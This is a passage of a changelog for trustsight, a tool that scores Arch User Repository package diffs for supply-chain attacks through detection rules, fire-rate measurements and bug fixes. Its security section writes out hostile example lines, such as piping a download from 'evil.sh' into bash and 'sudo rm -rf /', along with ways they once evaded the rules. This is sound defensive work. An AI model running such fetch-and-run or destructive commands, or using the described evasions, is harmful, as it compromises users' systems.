- **Drift detection for shipped rules.** `drifted_shipped_rules()` compares the
  on-disk `rules.toml` against the shipped template, flagging when a rule
  definition has drifted from the canonical copy.

- **`diff_truncated` field on `PackageFact`.** Marks analyses where the diff
  was truncated, so the report can indicate the change was only partially
  examined.

- **`_prefetch` uniqueness invariant.** An assertion guarantees that
  `_prefetch` receives unique package names, preventing redundant parallel
  clones.

- **Test fixtures shared via `conftest.py`.** `SHARED_RULES` (R001-R013) and
  `SHARED_CONFIG` (five top-level keys) are now defined once and imported by
  `test_analysis.py`, `test_rules.py`, `test_scenarios.py`, and
  `test_scoring.py`, removing 173 lines of duplication across four test files.

### Fixed

- **IDN homograph false positive.** `has_homograph()` no longer flags
  single-script labels containing non-ASCII Latin letters or combining marks.
  Only mixed-script labels are confusables per UTS #39 Highly Restrictive.
  Legitimate IDNs like `münchen.de` and `café.fr` are no longer reported.
  The `_latin_with_combining_marks()` helper was removed entirely.

- **PKGBUILD `check()` function.** Now builds a venv with
  `--system-site-packages`, installs the built wheel, and runs pytest
  (excluding `test_fetcher.py` and `test_rebaseline.py`). The previous bare
  `python -m pytest` call failed against an uninstalled source tree.

### Changed

- **Thread-local connection caching.** Database connections are cached per
  thread and per database path rather than opened per query. The hot paths
  issue thousands of small reads; opening a connection once instead of per
  query reduces overhead from ~0.35ms to effectively zero on repeat use.

- **`_is_current` uses HEAD commit time as fallback.** When no marker file
  exists (clones from earlier versions), the local HEAD commit time is compared
  against `upstream_mtime`. This eliminates a redundant `git fetch` for every
  package whose clone is already up to date, cutting the batch-review wall
  clock from ~2min to ~3s for a 19-package run.

- **`_ensure_init` runs init once per process.** `ensure_default_configs()` and
  `init_db()` are now called at most once per process via a module-level guard.
  Previously they ran on every `analyze_package()` call, adding ~100-200ms per
  package.

- **R066 (`_package_is_new`) capped at 100 commits.** The brand-new-package
  check previously walked the entire DAG to find the root commit. Packages with
  more than 100 commits are now skipped (they are definitionally not new),
  eliminating full-history walks that cost ~30-50s for packages with thousands
  of commits.

- **Lazy `__version__` loading.** The version string is now loaded via PEP 562
  `__getattr__` instead of `importlib.metadata.version()` at import time,
  avoiding a 46ms penalty on every `import trustsight`.

- **Pattern cache in `rules.py`.** Compiled regex patterns are cached across
  diffs, avoiding repeated `re.compile` calls that dominated the diff-analysis
  hot path.

- **Typosquat detection uses `top_dependency_pairs()`.** The rank-and-compare
  loop now fetches name-count pairs in a single query instead of running one
  query per candidate, fixing a performance regression on large databases.

### Removed

- **Dead code and duplicate patterns.** `parse_srcinfo_with_pkgbase` (uncalled)
  and several unreachable lines in `srcinfo.py` were removed.
  `_PINNING_ORDER` was unified in `buckets.py`; `risk_level()` is now the
  single source of truth across all callers.

- **`.seo-debug/` tracked artifacts.** Documentation JSON files committed by a
  prior zensical run are removed from the index and gitignored.

### Style

- **Ruff E402 violations resolved.** `log = logging.getLogger(__name__)` was
  moved below all imports in `analysis.py` and `llm.py`. Exception handlers in
  `override.py` were narrowed from `except BaseException` to `except Exception`.

### Documentation

- **Docstrings added to all 124 functions** across 19 source files, covering
  every public and private function including inner closures.

### Build

- **`.gitignore` updated for makepkg artifacts.** `packaging/aur/pkg/`,
  `packaging/aur/src/`, `*.tar.gz`, and `*.pkg.tar.*` are now ignored.

## [0.7.0] - 2026-07-26

### Added

- **Temporal context rules (R065-R067).** Three new code-emitted rules that
  inspect git commit timestamps on the AUR repository rather than diff content.
  All are on by default with no config toggle.

  | Rule | Name | Severity | Condition |
  |------|------|----------|-----------|
  | R065 | Very Recent Update | INFO (w 0) | HEAD commit < 72 h old |
  | R066 | Brand New Package | INFO (w 0) | First AUR commit < 30 days old |
  | R067 | Stale Package Revived | MEDIUM (w 15) | Gap to last analyzed commit > 365 days |

- **Install, build, and maintainer rules (R068-R073).** Six new code-emitted
  rules that inspect install hooks, GPG verification removal, build environment
  subversion, maintainer takeovers, capability density, and release cadence.

  | Rule | Name | Severity | Category | Condition |
  |------|------|----------|----------|-----------|
  | R068 | Install Hook Present | INFO (w 0) | context | PKGBUILD declares install= or diff touches *.install |
  | R069 | GPG Verification Removed | HIGH (w 25) | integrity | validpgpkeys populated before, empty/absent after |
  | R070 | Build Environment Subversion | HIGH/MEDIUM (w 25/15) | build | LD_PRELOAD/LD_LIBRARY_PATH (HIGH) or CFLAGS/LDFLAGS/MAKEFLAGS/PATH (MED) set inside build fn |
  | R071 | Untrusted Maintainer Takeover | HIGH (w 25) | maintainer | maintainer changed + new maintainer globally novel |
  | R072 | Capability Density Anomaly | INFO (w 0) | meta | rule hits span 3+ distinct categories |
  | R073 | Accelerated Release Cadence | metadata (never scored) | temporal-metadata | HEAD has 3+ ancestors in the last 24 h |

  All R068-R073 are always on, gated only by diff content or database
  maturity rather than an experimental flag.

- **Naming and dependency-set rules (R074-R075).** Two new code-emitted rules
  that detect package-name typosquatting and aggregate dependency-set expansion.

  | Rule | Name | Severity | Category | Condition |
  |------|------|----------|----------|-----------|
  | R074 | Package-Name Typosquat | HIGH (w 25) | naming | name within edit-distance 2 of a far-more-popular package, not a variant |
  | R075 | Dependency-Set Expansion | MEDIUM (w 15) | dependency | diff adds 3+ deps whose count x mean-rarity exceeds gate |

  Both are always on, gated only by a cold-start maturity check.
  R074 uses seed popularity data and requires a warmed database;
  R075 is fully corpus-calibratable.

- **Fire rates measured for R068-R075.** Measured against the 3246-diff
  benign corpus. R068 (20.95 %), R069 (0.03 %), R070 (0.25 %), R072 (15.87 %),
  R074 (1.12 % package-scan), R075 (0.34 %). All scored rules pass the 30 %
  gate. R071/R073 require live git history and are marked TBD in fire-rates.md.

### Fixed

- **Crash bugs in the analysis pipeline and CLI.** Seven fixes that prevented
  the tool from crashing on unusual package states or missing dependencies:

  | ID | Issue | Fix |
  |----|-------|-----|
  | B1 | `pygit2.GitError` raised `NameError` at runtime because pygit2 was not imported in `analysis.py` | Added `import pygit2` (not just a type stub) |
  | B2 | `generate_diff` crashes on stale commit OIDs that produce `None` commits | Guard against `None` before accessing `.tree` |
  | B3 | `get_head_commit` propagates `GitError` for empty/unborn repos | Wrapped in try/except, returns `""` on failure |
  | B4 | One bad package in a batch aborts the entire scan | Per-package try/except around `analyze_package` in CLI loop |
  | B5 | Tool crashes on startup when `rich` is not installed | Guard `console()` and all fallback paths with `HAS_RICH` checks |
  | B6 | Seed-import message leaks into JSON stdout with `--json` | Pass `quiet=True` to `maybe_auto_import_seed` in JSON mode |
  | B10 | `_simple_vercmp` compares version parts lexicographically (e.g. `9` > `10`) | Parse as integers before comparison |

- **`python -m trustsight` support.** Added `src/trustsight/__main__.py` so the
  tool works with `python -m trustsight` in addition to the installed script.

## [0.6.1] - 2026-07-25

### Changed

- **Eight experimental rules promoted to enabled by default.** D001, D002, D003,
  D004, R061, R062, R063, and R064 now default to `true` in both the config
  template and the code fallback.  Users who already have an
  `[experimental_rules]` section in their `config.toml` are unaffected and keep
  their existing setting; users without the section pick up the new defaults
  automatically.

  Fire rates (false-positive rates on the 3246-diff benign corpus) that
  justified the promotion:

  | Rule | Severity | Rate | Fires |
  |------|----------|------|-------|
  | D001 | HIGH | 0.15 % | 5/3246 |
  | D002 | HIGH | 0.00 % | 0/3246 |
  | D003 | MEDIUM | 0.46 % | 15/3246 |
  | D004 | HIGH | 0.00 % | 0/3246 |
  | R061 | HIGH | 0.22 % | 7/3246 |
  | R062 | HIGH | 0.09 % | 3/3246 |
  | R063 | HIGH | 0.00 % | 0/3246 |
  | R064 | MEDIUM | 0.03 % | 1/3246 |

  See [Fire Rates](explanation/fire-rates.md) for the full reference.

- **Baseline regenerated** with the new defaults.  The eight rules now appear
  in per-stratum fire-rate records.  Aggregate metrics (`zero_pct`, `p95`)
  shifted slightly as expected; the baseline is the new reference.

### Added

- **Fire Rates documentation page** (`docs/explanation/fire-rates.md`).
  Explains how fire rates are measured, the two corpora, the 30 % demotion
  gate, and per-rule tables for core, expanded, D-series, and build-function
  rules.

### Added

- **Four more supply-chain rules**, all off by default, each measured against the 3246-diff benign corpus before being designed. **D004 0.00 %, R062 0.09 %, R063 0.00 %, R064 0.03 %.**
    - **D004 (HIGH)** `provides`/`replaces` claims an established package unrelated to this one, installing it in front of the real thing. Variants (`htop-vim` → `htop`) and siblings (`linux-cachyos` → `linux-headers`) are suppressed, but a shared *ecosystem* prefix is not: `python-evil` claiming `python-requests` still fires, because thousands of unrelated packages share `python-`. "Established" is `pacman -Slq`, falling back to `observation_count`.
    - **R062 (HIGH)** a `.install` hook that fetches or performs a privileged operation. Hooks run as root at install time. Needed no new parsing: `generate_diff()` already includes `*.install` patches and `_classify_enclosing_function()` recognises `post_install()` like any other function.
    - **R063 (HIGH)** a patch applied from a URL, an absolute path, or process substitution.
    - **R064 (MEDIUM)** a `source=` URL downgraded from `https` to `http`. `extract_source_array_urls()` gained a `side` parameter so both sides of the diff can be compared.
- **D-series dependency-graph rules**, closing part of the documented build-dependency blind spot. All are **off by default** under a new `[experimental_rules]` config section, so `baseline.json` is unaffected until they are deliberately enabled.
    - **D001 (HIGH)** novel dependency: a name never observed anywhere in the AUR. Backed by a new `dependency_names` table seeded from every dependency entry **plus every package name and `provides` alias**, without which a real package that nothing else depends on would read as novel. Silent on an unseeded database rather than flagging everything.
    - **D002 (HIGH)** typosquatted dependency, e.g. `openss1` for `openssl`. Refines D001 and is reported in its place.
    - **D003 (MEDIUM)** `makedepends` gains a network-capable tool, so the build can fetch code no checksum covers.
- **R060 is now INFO (weight 0) and on by default.** It fires on 21.4 % of benign diffs because maintainers rewrite build functions routinely, and no narrowing reaches triage quality: restricting to an unchanged `pkgver` still leaves 11.6 %, and the "version bump that also edits `build()`" case it was proposed for is 9.8 %. At weight 0 it reports context to a reviewer without touching any score.
- **R061 (HIGH)** a download inside a build function whose URL is absent from `source=()`. Off by default.
- `scripts/generate_seed.py` records dependency names from the `.SRCINFO` it already reads, so seeding costs no extra I/O. `normalize_dependency` is shared with the runtime lookup: were the two to normalise differently, every query would miss and every dependency would look novel.
- `tokenizer.resolve_added_lines()` returns resolved lines with positions intact, so a rule can still resolve variables *and* know its enclosing function. Resolution alone discards that.
- The bundled seed is regenerated and now carries **209,909 dependency names** alongside 179,956 URLs and 35,903 maintainers. `seed.db.gz` grows from 13.0 MB to 19.9 MB.

  Fire rates against the 3246-diff benign corpus, so these are false-positive rates: **D001 0.15 %, D002 0.00 %, D003 0.46 %, D004 0.00 %, R061 0.22 %, R062 0.09 %, R063 0.00 %, R064 0.03 %, R060 21.4 %**. R060 is the outlier by design, marking any edit to a build function; at weight 5 it cannot reclassify a package alone but it moves benign p95 more than the other four together, so it deserves a separate decision from the rest.

### Fixed

- **`_EXPERIMENTAL_DEFAULTS` in `analysis.py`.** `load_config()` reads the user's `config.toml` verbatim and never merges new defaults in, so an existing install would never have seen `[experimental_rules]` and R060 would have been dead for every upgrade. Defaults now live in code, with the config file overriding them.
- **D004 did nothing when enabled on its own.** It shared a guard clause that only tested D001-D003, so the whole dependency block returned early unless one of those was also on. Covered by a test that enables each rule in isolation.
- **The dependency extractor read shell code as dependency names.** An unbounded fallback for unquoted array entries pulled `if`, `[[`, and `!` out of a `package()` body, and comments inside dependency arrays contributed every word of the note (`required`, `because`, `disabled`). Together these put D001 at 5.95 % against a true rate of 0.15 %. Array termination is now quote-aware and bounded, tokens are validated against the Arch package-name grammar, and comments are stripped.
- **`resolve_added_lines()` shifted every line after an assignment.** It zipped its output against `tokenize_and_resolve()`, which omits assignment lines, so any added assignment made the two sequences different lengths. An array header could vanish and a rule scoped to `build()` could be handed the wrong function. Substitution is now applied per line from a shared variable table, which `tokenize_and_resolve()` also uses so the two cannot diverge.
- **The release workflow could not commit its result.** The `Commit to the default branch` step failed with `fatal: not in a git directory`, despite `actions/checkout` having run `git init` in the workspace normally. Rather than fight the container's git, the workflow is now split: `makepkg` work (checksum, `--verifysource`, `--printsrcinfo`) runs in the Arch container and hands `PKGBUILD` and `.SRCINFO` over as an artifact, and a second job on the standard runner does the commit. `include-hidden-files` is set on the upload, since `.SRCINFO` is a dotfile and would otherwise be silently dropped. A `concurrency` group stops two releases racing on the same branch.
- **`packaging/aur/PKGBUILD` carried the wrong checksum.** Because the release workflow never completed, `pkgver` had been bumped to 0.5.1 while `sha256sums` still held the v0.5.0 tarball's hash, so `makepkg -si` failed validation for anyone following the documented install. Corrected to the real v0.5.1 hash and verified with `makepkg --verifysource`; `.SRCINFO` regenerated to match.

## [0.5.1] - 2026-07-25

### Added

- `.github/workflows/release-pkgbuild.yml`: on a `v*` tag, downloads the generated source tarball, computes its sha256, and writes `pkgver`, `pkgrel`, and `sha256sums` into `packaging/aur/PKGBUILD` on the default branch, regenerating `.SRCINFO` with `makepkg --printsrcinfo`. The PKGBUILD shipped to users therefore never carries `SKIP`. The checksum is validated with `makepkg --verifysource` before the commit, so a wrong hash fails the release rather than reaching a user.

  The update lands on the default branch and the tag is never moved. GitHub generates the tarball from the tree the tag points at, so amending the tag would change the tarball and invalidate the checksum just computed.

### Fixed

- `packaging/aur/.SRCINFO` was stale: it declared `pkgver = 0.3.0`, an all-zero `sha256sums`, and omitted the `python-typer` dependency the PKGBUILD requires. Regenerated, and now kept current automatically by the release workflow.

## [0.5.0] - 2026-07-25

### Added

- `scripts/build_corpus.py --from-manifest`: rebuilds the exact corpus recorded in `corpus.lock` instead of re-selecting packages by AUR popularity. Fetches only the branches named in the lock into an empty bare repo, so reconstruction takes minutes rather than requiring a full clone of the AUR monorepo. This is what lets CI materialise the corpus, which is gitignored and therefore never present on a fresh checkout.

### Security

- **A message prefix disabled every scoped rule.** Any line starting with `echo`/`printf`/`msg`/ followed by a quote was classified as an inert "message" in its entirety, but a shell line does not end at its first command. `echo "x"; sudo rm -rf /` scored 0 where `sudo rm -rf /` scored 40, so a seven-character prefix switched off R009 (CRITICAL), R010, and R011. Message context now requires the line to contain no command separator (`;`, `&`, `|`) or substitution (`$(`, backtick).
- **Line continuations bypassed the CRITICAL pipe-to-shell rules.** Rules match one line at a time, so splitting `curl http://evil.sh | bash` across a trailing backslash left R001/R002 with only a `curl \` fragment, dropping the score from 65 to 25. Continuations are now joined into one logical line before matching, for both the raw and resolved paths.
- **Variable resolution never ran inside function bodies.** The tokenizer's assignment pattern was anchored at `^(\w+)=`, so any indented assignment (that is, every assignment inside a function) was skipped and the variable table stayed empty. `C=curl` followed by `$C http://evil.sh | bash` resolved to nothing and defeated every rule matching resolved strings, scoring 20 against a baseline of 65. Assignments are now recognised when indented and when introduced by `local`/`export`/`declare`/`readonly`/`typeset`.
- **One-line function bodies escaped function scoping.** `package() { curl evil | bash; }` was classified before the depth counter advanced, so the line read as `other` and `function_body`-scoped rules skipped it; the counter was also left raised for everything that followed.
- **`..` passed package-name validation and could delete the cache root.** `_VALID_PKG_NAME` accepted `.` and `..`, so `repo_path("..")` resolved to the parent of the repo cache, which `clone_or_fetch` then passed to `shutil.rmtree` when it failed to open as a repository. Both names are now rejected, and `repo_path` additionally asserts the resolved path is directly inside the cache root.
- `discovery.fetch_package_info` interpolated the package name straight into the RPC query string; an unescaped `&` or `#` could inject or truncate parameters. It now uses `urlencode`, matching `get_aur_latest_versions`.

### Fixed

- **Mirror Integrity Check never ran.** The `Alert on failure` step's script block was mis-indented, making `mirror-check.yml` unparseable; every run failed during workflow startup. The workflow now also reconstructs the corpus before verifying it, rather than assuming a directory that cannot exist in CI.
- **Corpus Drift Detection failed with `Corpus not found`** for the same reason, and now rebuilds the corpus from the lock first (caching the fetched AUR objects).
- **Corpus diffs were not reproducible across machines.** `git` scales the abbreviation length in `index <old>..<new>` lines to a repository's object count, so a sparse clone emitted 7-character hashes where the full mirror emitted 12: byte-different diffs for identical commits, invalidating `corpus_content_sha256`. `core.abbrev` is now pinned to 12 and recorded in the lock.
- **Overlapping strata double-counted diffs.** A package matching two strata (`python-foo-git` matches both `lang_ecosystem` and `vcs_git`) was walked once per stratum, and both entries were kept, inflating per-stratum fire rates. Entries are now deduplicated at lock-write time, keeping the last stratum to match the overwrite order the corpus on disk already had. `corpus.lock` drops from 3332 to 3246 entries with no change to the corpus itself.
- `corpus.lock` recorded `strata_file` as an absolute path from the generating machine.
- Drift reports are no longer passed through a `GITHUB_OUTPUT` heredoc, whose delimiter could be forged by diff content and whose payload could exceed the 1 MB output limit. Both workflows also suppress duplicate issues instead of filing one per run.

### Documentation

- `re-baselining.md` described behaviour `rebaseline.py` does not have: it does not check out the corpus, does not validate CI gates, and reports no `p5`/`p50`. Strata are package shapes, not `benign`/`malicious`/`synthetic`. Corrected, and the required corpus-reconstruction step added.
- `writing-a-rule.md` referenced a `--check-fire-rate` flag that does not exist, and the wrong corpus path.
- Installation is now documented as a single path: `git clone` from GitHub plus `makepkg -si` against the in-repo PKGBUILD. The pipx and `pip` routes have been removed, and the docs note that the package is not yet published to the AUR.
- `rules.md` documented a bare function header as the only header behaviour, and did not mention that continuations are joined before matching. Both corrected, along with the qualification that `message` context requires the line to be only a message.
- `cli.md` listed `scope-contradiction` as an error; it is now a warning.

## [0.4.1] - 2026-07-25

### Added

- `--json` flag on all commands for machine-readable output.
- PKGBUILD build+install CI workflow using `archlinux:latest` container.
- AUR install instructions in README and getting-started guide.

### Changed

- CLI migrated from `argparse` to `typer`: auto-generated `--help`, type-annotated callbacks, `--json` flag per command. Entry point renamed from `main` to `app`.
- CLI tests updated from `patch(sys.argv)` pattern to `typer.testing.CliRunner`.
- Documentation tests parse typer patterns (`add_typer`, `@command`) instead of argparse `add_parser`.

### Fixed

- Mirror-check CI now triggers on `push` for corpus.lock and benign-corpus changes.

## [0.4.0] - 2026-07-25

### Added

- Multi-repo and foreign package discovery: new `--repo`, `--foreign`, `--all-repos` flags for `trustsight review`. Packages can be scanned from specific local repositories, all auto-detected local repos (excluding official ones), and/or foreign packages. Config-driven defaults via new `[discovery]` section in `config.toml`.
- `vercmp`-based version comparison for accurate detection of outdated packages (replaces string inequality).
- Graceful fallback to string comparison when `vercmp` binary is missing.

### Changed

- Python requirement lowered from `>=3.12` to `>=3.10`. `tomllib` usage replaced with a `tomli` fallback shim for 3.10 compatibility.
- CI matrix expanded to test Python 3.10 through 3.14.
- Catastrophic backtracking detection threshold raised (`_BACKTRACK_REPS` 18 -> 22) to remain effective on Python 3.12+ optimized regex engine.

## [0.3.1] - 2026-07-24

### Fixed

- Verdict text no longer printed to stdout during `review` for every package (stray `print(result)` in `generate_verdict_stream` non-streaming path)
- Stale `~/.pyenv/shims/trustsight` shadowed pipx install, causing `trustsight -v` to report 0.1.0 instead of the actual installed version

### Added

- `-v` / `--version` CLI flags via `importlib.metadata.version()`
- Graceful `KeyboardInterrupt` handling: clean `Interrupted.` message and exit code 130 instead of an SSL/httpx traceback

### Changed

- `-h` help now includes config subcommands section (`config show`, `config set`, `config sync-rules`) and usage examples

## [0.2.2] - 2026-07-24

This release fixes a critical false positive in R013 that could score benign
packages 100/100, restores the novelty engine (Tier C) which had been inert
since v0.1, and ships a pre-seeded database of 178,491 AUR source URLs to
eliminate cold-start INCONCLUSIVE verdicts.

**Existing users must run `trustsight config sync-rules --update`** to receive
the corrected detection patterns. `rules.toml` is written only when absent, so
a package upgrade alone does not update it. The command is additive and never
overwrites a rule you have edited.

Note: `v0.2.1` was already tagged at the previous commit, and the `[0.3.0]`
section below is recorded in this changelog but was never tagged. This release
takes the next free patch number; the 0.3.0 discrepancy is left for a separate
reconciliation.

### Fixed

- R013 (FATAL) fired on legitimate localized text. U+200B-U+200D are mandatory joiners in Malayalam, Lao and other scripts, so a `GenericName[ml]=` line in a browser package scored 100/100; measured on two packages in the benign corpus. Zero-width characters now require ASCII neighbours; bidi overrides, invisible operators and tag characters still fire unconditionally. The pattern also gains U+200E/U+200F, U+2060-U+2064 and the tag block, which `unicode.py` already listed and which account for the documented recall gap.
- R058 fired on `"${pkgdir}"/usr/lib/...`, where the quote closes before the path, and on absolute paths quoted inside `echo` strings. It now requires the command to be the first token on the line and the path to start an argument.
- The maintainer was read from `.SRCINFO`, which does not carry one; checked against the AUR mirror, 0 of 200 `.SRCINFO` files have a `maintainer =` line, while every PKGBUILD opens with `# Maintainer:`. `get_maintainer_from_commit()` therefore always returned `None`, silently disabling `maintainer_changed`, the highest novelty weight (20), and C006. Now read from the PKGBUILD comment, with `.SRCINFO` as a fallback.
- `scan_diff` tracked novelty differently from the live path in three ways: it compared raw URLs instead of `normalize_url`-d ones (so every version bump read as novel), it derived "first seen globally" from the per-package set (making it identical to per-package), and it overwrote rather than OR-ed the flags across multiple URLs (so a familiar URL masked a novel one).
- Tier C novelty was inert: `observation_count` was never populated outside tests, so `maturity()` always read 0 and every novelty weight scored zero. Now sourced from `count_observations()`.
- Homograph detection missed Cyrillic confusables. `has_homograph()` only matched codepoints named `LATIN*`, while the `CONFUSABLES` table it sits beside is Cyrillic; so `github.cоm` classified as `unknown` (+20) rather than `homograph_attack` (+30). Replaced with mixed-script-per-label detection, plus punycode decoding to close the `xn--` bypass. Legitimate single-script IDNs (`.рф`, Japanese, Korean) are not flagged.
- `cli.py` called `set_config` without importing it, so `trustsight config set` raised `NameError`.
- `scripts/build_corpus.py` had a 600s timeout on the AUR bare clone, which the repository cannot meet, so the script could never complete on a fresh machine. Partial clones were also left on disk and reused silently, since `rev-parse --git-dir` succeeds on an interrupted clone.

### Added

- Novelty seed database. `scripts/generate_seed.py` builds it from the AUR git mirror by parsing `.SRCINFO` (including the arch-suffixed `source_x86_64` arrays); `trustsight seed-db` imports it. Without a seed, a fresh install has an empty `source_urls` table, so `url_first_globally` fires for github.com and every other ordinary host, and `maturity()` returns 0 because there is no analysis history; leaving every Medium verdict downgraded to INCONCLUSIVE. Import is additive and idempotent, and never overwrites a row learned from a real analysis.
- `metadata` and `maintainer_counts` tables, and `effective_observation_count()`: maturity falls back to a seed-supplied bootstrap count, and real analyses take over as soon as they outnumber it, so the tool never depends on external data permanently.
- `trustsight lint-rules` (`--file` for CI): detects unreachable, over-broad, and malformed rules. Errors on empty patterns, duplicate ids, ids owned by `analysis.py`, comment-shadowed rules, and scope contradictions; warns on rules that fire on ordinary packaging.
- Expanded ruleset R039-R059 (21 rules), calibrated against a 3322-diff stratified benign corpus and enabled by default. Fourteen fire on zero benign diffs; every remaining hit was inspected individually and all but one were true positives. R053 was split by target: setuid inside `$pkgdir` is MEDIUM (Chromium's sandbox helper legitimately needs 4755, and at MEDIUM this changes no package's risk band), while setuid on an absolute path is a separate HIGH rule, R059. The `experimental` flag remains supported for future additions.
- Programmatic rules C004 (checksum removed for unchanged source), C005 (binary artifact from untrusted source), C006 (maintainer change with new source domain), C007 (command substitution in source array).
- Rule scopes may name a PKGBUILD function (`scope = ["pkgver"]`), not just a line context.
- `added_only` rule field: match only added lines, so deleting a suspicious line no longer raises a package's score.
- Ephemeral paste and file-drop services added to the `raw_hosting` bucket.

### Changed

- Novelty weights recalibrated now that tier C is live: `url_first_globally` 15 → 10, `url_first_in_package` 10 → 5, `maintainer_first_in_package` 20 → 15. The previous values had never been exercised, because `observation_count` was never populated and the maturity multiplier was permanently 0. At full maturity they took a borderline 15-point package with a novel URL and a novel maintainer to 60 (High); the new values keep that case at 45 (Medium). Maintainer novelty remains the strongest signal.
- `_structural_findings()` is now shared by `analyze_package()` and `scan_diff()`, removing ~110 lines duplicated between the live and offline pipelines.

## [0.3.0] - 2026-07-18

- Score column renamed to "Risk Score"
- Rich progress output during review
- AUR RPC batching for performance
- Handle empty AUR repos gracefully
- FATAL severity with hard stop at 100
- Verification evidence detection and scoring
- Source pinning classification
- Code rules C001-C003 for structural anomalies
- URL normalization for novelty dedup
- Maturity-based novelty gating with Inconclusive risk level
- Scope-based rule matching (function_body context)
- R012 (prompt injection) and R013 (unicode bidi) rules
- LLM verdict integrity assertions
- scan_diff offline pipeline for benchmark use
- is_skip_justified analysis for SKIP checksums
- Fix: SKIP checksums no longer count as verification evidence
- Removed R004/R005 from TOML rules (now programmatic, context-aware)
- Default LLM provider changed to openai
- CI workflows for corpus drift monitoring
- 267 tests (was 218)

## [0.2.0] - 2026-07-15

- R004/R005 rule hardening with quote bypass fix
- Tokenizer iteration fix
- Forge classification cap
- IDN detection
- Shell variant coverage
- base64 --decode detection

## [0.1.0] - 2026-07-12

- Initial release
- R001-R011 rules
- AUR diff analysis pipeline
- Deterministic scoring
- SQLite novelty tracking
- LLM verdict integration
- Basic CLI (review, inspect, history, config)
[0.1.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.1.0
[0.2.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.2.0
[0.2.2]: https://github.com/emiliano-go/trustsight/releases/tag/v0.2.2
[0.3.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.3.0
[0.3.1]: https://github.com/emiliano-go/trustsight/releases/tag/v0.3.1
[0.4.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.4.0
[0.4.1]: https://github.com/emiliano-go/trustsight/releases/tag/v0.4.1
[0.5.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.5.0
[0.5.1]: https://github.com/emiliano-go/trustsight/releases/tag/v0.5.1
[0.6.1]: https://github.com/emiliano-go/trustsight/releases/tag/v0.6.1
[0.7.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.7.0
[0.7.1]: https://github.com/emiliano-go/trustsight/releases/tag/v0.7.1
[0.7.2]: https://github.com/emiliano-go/trustsight/releases/tag/v0.7.2
[0.8.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.8.0
[0.9.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.9.0
[0.10.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.10.0
[0.10.1]: https://github.com/emiliano-go/trustsight/releases/tag/v0.10.1
[0.11.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.11.0
[0.12.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.12.0
[0.12.1]: https://github.com/emiliano-go/trustsight/releases/tag/v0.12.1
[0.13.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.13.0
[0.13.1]: https://github.com/emiliano-go/trustsight/releases/tag/v0.13.1
[0.13.2]: https://github.com/emiliano-go/trustsight/releases/tag/v0.13.2
[0.14.0]: https://github.com/emiliano-go/trustsight/releases/tag/v0.14.0
[0.14.1]: https://github.com/emiliano-go/trustsight/releases/tag/v0.14.1
[Unreleased]: https://github.com/emiliano-go/trustsight/compare/v0.14.1...HEAD
